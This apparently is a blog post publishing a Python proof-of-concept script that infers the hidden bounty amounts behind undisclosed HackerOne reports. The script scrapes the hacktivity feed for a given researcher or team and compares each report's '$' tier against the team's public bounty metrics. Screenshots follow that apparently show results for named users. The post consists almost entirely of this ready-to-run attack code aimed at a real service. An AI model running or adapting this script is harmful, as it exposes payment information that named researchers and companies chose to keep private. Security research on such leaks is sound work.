---
layout: post
title: Cracked HackerOne Hidden Bounty Amount
categories: articles
---

<p align="right" class="date">{{ page.date | date_to_string }} - CongRong</p>

## POC:

{% highlight python %}

#!/usr/bin/env python
#coding:utf-8

import json
import requests
from datetime import datetime


class crack(object):
	def __init__(self, user):
		self.teams = {}
		self.user = user
		self.formatted_bounty = {
			"$":["BOUNTY_LOW","base_bounty","<"],
			"$$":["BOUNTY_MEDIUM","base_bounty", ">="],
			"$$$":["BOUNTY_HIGH","top_bounty_lower_range", ">="],
			"$$$$":["BOUNTY_SEVERE","top_bounty_lower_range", ">="]
		}
		self.headers = {
			'accept': 'application/json',
			'x-requested-with': 'XMLHttpRequest',
		}


	def loads_hide_reward(self):
		print "[+] Loads Hidden Bounty Reports ..."
		url = 'https://hackerone.com/hacktivity?sort_type=latest_disclosable_activity_at&page={}&filter=type%3Abounty-awarded%20{}&range=forever'
		req = json.loads(requests.get(url.format(1, self.user), headers=self.headers).content)
		bounty_reports = req['reports']
		if req['pages'] > 1:
			print "[+] There are {} pages".format(req['pages'])
			for i in range(1,req['pages'] + 1):
				bounty_reports += json.loads(requests.get(url.format(i, self.user), headers=self.headers).content)['reports']

		hide_bounty_reports = filter(lambda x:x['bounty_disclosed'] == False, bounty_reports)
		if len(hide_bounty_reports) == 0:
			print "[+] Hide Bounty Reports Count 0!"
			exit()

		results = {}
		for k,p in enumerate(hide_bounty_reports):
			report_tmp = {}
			report_tmp['id'] = p['id']
			report_tmp['team'] = p['team']['handle']
			report_tmp['from_or_to'] = report_tmp['team'] if 'from%3A' in self.user else p['reporter']['username']
			report_tmp['bounty'] = p['formatted_bounty']
			time_format = datetime.strptime(p['latest_disclosable_activity_at'], "%Y-%m-%dT%H:%M:%S.%fZ").strftime("%Y/%m/%d %H:%M:%S")
			report_tmp['hacktivity'] = p['latest_disclosable_action'] + " " + time_format
			results[k] = report_tmp
			print "[{}] -> {} {} {} {}".format(k, 
											report_tmp['id'], 
											report_tmp['from_or_to'], 
											report_tmp['bounty'], 
											report_tmp['hacktivity']
											)

		report_key = raw_input("Select Bounty Hidden Report [Default ALL]:")
		if report_key.isdigit() and 0 <= int(report_key) <= len(results) - 1:
			report_keys = [int(report_key)]
		else:
			report_keys = range(len(results))

		for i in report_keys:
			res_tmp = results[i]
			team = res_tmp['team']
			if team not in self.teams: self.teams[team] = self.loads_team(team)
			bounty_dict = self.formatted_bounty[res_tmp['bounty']]
			team_base_bounty = self.teams[team]['base_bounty']
			team_top_bounty = self.teams[team]['top_bounty_lower_range']

			if team_base_bounty == None and team_top_bounty and res_tmp['bounty'] in ["$","$$"]:
				math_flag = "<"
				bounty = self.teams[team]['top_bounty_lower_range']

			elif team_base_bounty and team_top_bounty == None:
				bounty = team_base_bounty
				math_flag = bounty_dict[2] if res_tmp['bounty'] in ["$","$$"] else ">"

			elif team_base_bounty and team_top_bounty and res_tmp['bounty'] == "$$":
				print "\033[15;32m[{}:{}] ${} > Bounty >= ${}\033[0m".format(i, bounty_dict[0], team_top_bounty, team_base_bounty)
				continue

			elif not filter(lambda x:x != None, [team_base_bounty, team_top_bounty]):
				print "\033[15;33m[{}] {} Team not show the Amount of Bounty, please read https://hackerone.com/{} page find this\033[0m".format(i,team,team)
				math_flag = ">"
				bounty = 0

			else:
				math_flag = bounty_dict[2]
				bounty = self.teams[team][bounty_dict[1]]

			print "\033[15;32m[{}:{}] Bounty {} ${}\033[0m".format(i, bounty_dict[0], math_flag, bounty)


	def loads_team(self, team):
		print "[+] Analysis {} Team Information ...".format(team)
		team_base = json.loads(requests.get('https://hackerone.com/{}'.format(team), headers=self.headers).content)
		team_metrics = json.loads(requests.get('https://hackerone.com/{}/profile_metrics.json'.format(team), headers=self.headers).content)
		team_rule = {}
		team_rule['base_bounty'] = team_base['base_bounty'] if 'base_bounty' in team_base.keys() else None
		team_rule['top_bounty_lower_range'] = team_metrics['top_bounty_lower_range']

		return team_rule


if __name__ == '__main__':
	crack_type = raw_input("please Input Crack Type[0:hack {default}/1:team]")
	if crack_type.isdigit() and int(crack_type) == 1:
		user = "to%3A" + raw_input("please Input Team Names has Handle:")
	else:
		user = "from%3A" + raw_input("please Input HackerOne Id:")
	crack(user).loads_hide_reward()

{% endhighlight %}

@geekboy:

<img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/579xovyz.png">

<img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/575csqpv.png">

@quora:

<img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/378eahxk.png">

<img src="https://blog-1252048719.cos.ap-shanghai.myqcloud.com/21uemnb.png">